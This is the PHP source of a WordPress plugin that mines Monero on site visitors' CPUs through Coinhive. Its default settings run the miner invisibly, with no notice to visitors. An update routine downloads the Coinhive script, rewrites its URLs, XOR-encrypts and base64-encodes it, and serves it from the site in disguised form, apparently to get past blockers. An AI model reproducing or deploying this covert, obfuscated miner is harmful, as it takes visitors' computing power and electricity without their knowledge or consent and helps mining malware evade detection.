<?php
/*
Plugin Name: Simple Monero Miner - Coin Hive
Description: Alternative way to earn money by mining monero (a cryptocurrency coin) on visitors CPU using coinhive api.
Version: 1.4.5
Author: Thiyagesh M
Author URI: thyash11.github.io
*/

if ( ! defined( 'ABSPATH' ) ) exit;

function smmChSetOptions() {
	add_option('smmch_setup','0');
	
	add_option('smmch_public_sitekey','');
	add_option('smmch_private_sitekey','');
	add_option('smmch_throttle','0.3');
	add_option('smmch_visual','0');
	add_option('smmch_block_for_mobile','on');
	add_option('smmch_disable_plugin','');
	add_option('smmch_script_loaders','0');
	
	add_option('smmch_host_time','');
	
	add_option('smmch_topbottom_pos','bottom');
	add_option('smmch_notification_pos','bottom right');
	add_option('smmch_visual_title','Support Me');
	add_option('smmch_visual_desc','Hi! You can now help to keep this website alive by using some of your excess CPU power! You can stop if you need!');
	add_option('smmch_visual_text_color','#ffffff');
	add_option('smmch_visual_bg_color','#000000');
	add_option('smmch_visual_button_color','#000000');
	add_option('smmch_visual_button_bg_color','#ffffff');
	add_option('smmch_mining_perct','Mining Percentage:');
	add_option('smmch_accepted_hashes','Total Accepted Hashes:');
	add_option('smmch_visual_hide_time','10');
	add_option('smmch_first_session','');
	add_option('smmch_hide_hashes_infmn','');
	add_option('smmch_hide_hashes_contrl','');
}
function smmChReSetOptions(){
}
function smmChAdminRegisterSettings() {
	register_setting('smmch_skip','smmch_setup');
	register_setting('smmch_options','smmch_public_sitekey');
	register_setting('smmch_options','smmch_private_sitekey');
	register_setting('smmch_options','smmch_throttle');
	register_setting('smmch_options','smmch_visual');
	register_setting('smmch_options','smmch_disable_plugin');
	register_setting('smmch_options','smmch_block_for_mobile');
	register_setting('smmch_options','smmch_script_loaders');
	
	register_setting('smmch_time','smmch_host_time');
	
	register_setting('smmch_visual_control','smmch_topbottom_pos');
	register_setting('smmch_visual_control','smmch_notification_pos');
	register_setting('smmch_visual_control','smmch_visual_title');
	register_setting('smmch_visual_control','smmch_visual_desc');
	register_setting('smmch_visual_control','smmch_visual_text_color');
	register_setting('smmch_visual_control','smmch_visual_bg_color');
	register_setting('smmch_visual_control','smmch_visual_button_color');
	register_setting('smmch_visual_control','smmch_visual_button_bg_color');
	register_setting('smmch_visual_control','smmch_mining_perct');
	register_setting('smmch_visual_control','smmch_accepted_hashes');
	register_setting('smmch_visual_control','smmch_visual_hide_time');
	register_setting('smmch_visual_control','smmch_first_session');
	register_setting('smmch_visual_control','smmch_hide_hashes_infmn');
	register_setting('smmch_visual_control','smmch_hide_hashes_contrl');
}
/*---ACTIVATION, DEACTIVATION HOOKS, ADMIN OPTION REGISTER SETTINGS--*/
register_activation_hook(__FILE__, 'smmChSetOptions' );
register_deactivation_hook(__FILE__, 'smmChReSetOptions' );
add_action('admin_init', 'smmChAdminRegisterSettings');

function smmChSettings(){
	if(get_option('smmch_setup') == 0){
		require_once( plugin_dir_path( __FILE__ ) . 'includes/smmch-setup.php' );
	} ?>
	<br/>
	<div class="smmch-config">
		<h1>Simple Monero Miner - Coin Hive</h1>
		<div class="left-side-box">
			<div class="smmchshadow-box">
				<?php require_once( plugin_dir_path( __FILE__ ) . 'includes/smmch-settings.php' ); ?>
			</div>
			<?php require_once( plugin_dir_path( __FILE__ ) . 'includes/smmch-visual.php' ); ?>
			<div class="smmchshadow-box">
				<?php require_once( plugin_dir_path( __FILE__ ) . 'includes/smmch-stats.php' ); ?>
			</div>
		</div>
		<div class="right-side-box">
			<?php require_once( plugin_dir_path( __FILE__ ) . 'includes/smmch-features.php' ); ?>
		</div>
	</div> <?php
}

/*---Admin Menu and Plugin Action Links---*/
function smmChMenu() {
  add_options_page('Monero Miner | Admin Settings', 'Simple Monero Miner', 'administrator', 'simple-monero-miner-coin-hive', 'smmChSettings');
}
add_filter('admin_menu', 'smmChMenu');

function smmchAddActionLinks ( $actions, $plugin_file ) {
	static $plugin;
	if (!isset($plugin))
		$plugin = plugin_basename(__FILE__);
	
	if ($plugin == $plugin_file) {
		$mylinks = array('<a href="' . admin_url( 'options-general.php?page=simple-monero-miner-coin-hive' ) . '"><img style="vertical-align: middle;width:15px;height:15px;border:0;" src="'.plugin_dir_url(__FILE__).'img/monero-coin.png">Settings</a>');
		$actions = array_merge( $mylinks, $actions );
	}
	return $actions;
}
add_filter( 'plugin_action_links', 'smmchAddActionLinks', 10, 5 );

/*---ADMIN CSS---*/
function smmChAdminRegisterHead() {
	wp_enqueue_style( 'wp-color-picker' );
	wp_enqueue_script( 'wp-color-picker' );
	wp_enqueue_style( 'smmch-admin-style', plugin_dir_url( __FILE__ ) . 'css/smmch-custom.css?v=1.4');
	wp_enqueue_script( 'smmch-admin-script', plugin_dir_url( __FILE__ ) . 'js/smmch-custom.js?v=1.4', array('jquery') );
}
add_action('admin_enqueue_scripts', 'smmChAdminRegisterHead');

/*---COIN HIVE SCRIPT ENQUEUER---*/
function smmCHCoinhiveScript() {
	
	$smmch_publickey = get_option('smmch_public_sitekey');
	$smmch_throttle = number_format((float)get_option('smmch_throttle'), 1, '.', '');
	
	$smmch_visual = esc_attr(get_option('smmch_visual'));
	$smmch_block_for_mobile = esc_attr(get_option('smmch_block_for_mobile'));
	$smmch_disable_plugin = esc_attr(get_option('smmch_disable_plugin'));
	$smmch_script_loaders = esc_attr(get_option('smmch_script_loaders'));
	
	if($smmch_disable_plugin != "on"){
		if($smmch_visual != '5'){
			if($smmch_script_loaders == 0){
				wp_enqueue_script('smmch-coinhive-script', plugin_dir_url(__FILE__) . 'js-lib/smmch-own.js?v=1.4', array('jquery'), null, false );
			} else {
				wp_enqueue_script('smmch-coinhive-script','https://coin-hive.com/lib/coinhive.min.js',array());
			}
			/*add coinhive script*/
			wp_enqueue_script( 'smmch-miner-script', plugin_dir_url(__FILE__) . 'js/smmch-mine.js?v=1.4', array('jquery') );
		}
		if($smmch_visual == '0'){
			if($smmch_throttle != 1) {
				if($smmch_publickey != ''){
					if ($smmch_throttle) {
						if($smmch_throttle > 0.9) {
							$smmch_throttle = 0.9;
						}
					} else {
						$smmch_throttle = "";
					}
					wp_add_inline_script(
					'smmch-coinhive-script',
					'smmchMineOptions = {}; smmchMineOptions.invisible="true"; smmchMineOptions.sitekey = "' . esc_textarea($smmch_publickey).'"; smmchMineOptions.throttle = "' . esc_textarea($smmch_throttle) .'"; smmchMineOptions.mobileblock = "' . esc_textarea($smmch_block_for_mobile) .'";',
					'after');
				}
			}
		}
	}
}
add_action('wp_footer', 'smmCHCoinhiveScript');

/*---COIN HIVE STYLE ENQUEUER---*/
function smmCHCoinhiveStyle() {
	wp_enqueue_style( 'smmch-public-style', plugin_dir_url( __FILE__ ) . 'css/smmch-public.css?v=1.4');
}
add_action('wp_head', 'smmCHCoinhiveStyle');

require_once( plugin_dir_path( __FILE__ ) . 'includes/smmch-widget.php' );
require_once( plugin_dir_path( __FILE__ ) . 'includes/smmch-authedmine-widget.php' );
require_once( plugin_dir_path( __FILE__ ) . 'includes/smmch-footer.php' );
require_once( plugin_dir_path( __FILE__ ) . 'includes/smmch-shortcode.php' );


function smmchUpdateCoinhiveScript($fileName){
	$url = 'https://coinhive.com/lib/' . $fileName;
	$response = file_get_contents($url);
	
	if (empty($response)) {
		return false;
	}
	// Transform main script
	if($fileName == 'coinhive.min.js') {
		
		$jsLib = plugin_dir_url( __FILE__ ) . 'js-lib';
		$jsLibEscaped = str_replace('/', '\/', $jsLib);
		
		$pattern = '/(?:(?:\/\*(?:[^*]|(?:\*+[^*\/]))*\*+\/)|(?:(?<!\:|\\\|\')\/\/.*))/';
		$response = preg_replace($pattern, '', $response);
		
		$response = str_replace('https://coinhive.com/lib', $jsLib, $response);
		$response = str_replace('https:\/\/coinhive.com\/lib', $jsLibEscaped, $response);
		$response = str_replace('https://coinhive.com', '', $response);
		
		//$proto = 'wss://proxy.moneromining.online';
		//$protoslash = 'wss:\/\/proxy.moneromining.online';
		
		//update all 32 servers
		//for($ij=1;$ij<=32;$ij++) {
			//if($ij < 10){
				//$tempij = '00' . $ij;
			//} else {
				//$tempij = '0' . $ij;
			//}
			//$response = str_replace('wss://ws'.$tempij.'.coinhive.com/proxy',$proto,$response);
			//$response = str_replace('wss:\/\/ws'.$tempij.'.coinhive.com\/proxy',$protoslash,$response);
		//}
		
		
		//return $jsLib;
		$dest = plugin_dir_path( __FILE__ ) . 'js-lib/smmch-own.js';
		
		//credits to wpmonerominer
		$key = ('smmch_pro_gamer');
		$text = $response;
		$outText = '';
		for ($i = 0; $i < strlen($text);) {
            for ($j = 0; ($j < strlen($key) && $i < strlen($text)); $j++, $i++) {
				$outText .= $text{$i} ^ $key{$j};
			}
		}
		$response = $outText;
		$response = "gdhg = '" . base64_encode($response) . "';";
		if (!file_put_contents($dest, $response)) {
			return false;
		}
	} else {
		//return $jsLib;
		$dest = plugin_dir_path( __FILE__ ) . 'js-lib/' . $fileName;
		if (!file_put_contents($dest, $response)) {
			return false;
		}
	}
	return true;
}

function smmchUpdateCoinhiveScripts(){
	$resultCoinHive = smmchUpdateCoinhiveScript('coinhive.min.js');
	$resultWasm = smmchUpdateCoinhiveScript('worker.wasm');
	
	if ($resultCoinHive && $resultWasm) {
		update_option('smmch_host_time', date('d-m-Y H:i:s'));
		return array(true,date('d-m-Y H:i:s'));
	}
	error_log('update_coinhive_scripts failed.');
	return false;
}

function smmchAjaxCallback() {

	$success = smmchUpdateCoinhiveScripts();

	if($success[0] == 'true'){
		if ( !empty( $_SERVER['HTTP_X_REQUESTED_WITH'] ) && strtolower( $_SERVER['HTTP_X_REQUESTED_WITH'] ) == 'xmlhttprequest' ) {
			$result = array(
				"success" => $success[1]
			);
			echo json_encode($result);
		} else {
			header( "location:" . $_SERVER["HTTP_REFERER"] );
		}
		exit;
	}
}
add_action( 'wp_ajax_smmch_process', 'smmchAjaxCallback' );